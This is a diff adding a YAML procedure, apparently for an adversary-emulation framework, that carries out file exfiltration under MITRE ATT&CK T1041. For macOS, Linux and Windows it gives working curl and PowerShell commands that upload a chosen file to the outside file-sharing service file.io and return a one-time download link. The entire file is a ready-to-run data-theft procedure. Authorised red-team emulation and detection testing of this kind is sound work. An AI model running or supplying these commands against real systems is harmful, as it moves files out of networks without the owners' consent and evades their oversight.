@@ -1,0 +1,29 @@
+id: ea713bc4-63f0-491c-9a6f-0b01d560b87e
+metadata:
+  version: 1
+  authors:
+    - privateducky
+  tags:
+    - Crown Jewels
+name: File.io exfil
+description: |
+  File.io is a common internet file share service which allows arbitrary file upload and it outputs a link, which can
+  be used for a 1-time download of the file. This procedure uploads a file to file.io.
+tactic: exfiltration
+technique:
+  id: T1041
+  name: Exfiltration Over Command and Control Channel
+platforms:
+  darwin:
+    sh:
+      command: |
+        curl -F "file=@#{file.T1560.001}" https://file.io
+  linux:
+    sh:
+      command: |
+        curl -F "file=@#{file.T1560.001}" https://file.io
+  windows:
+    psh:
+      command: |
+        $body = "file=$(Get-Content #{file.T1560.001} -raw)";
+        Invoke-RestMethod -Uri https://file.io -Method POST -body $body;
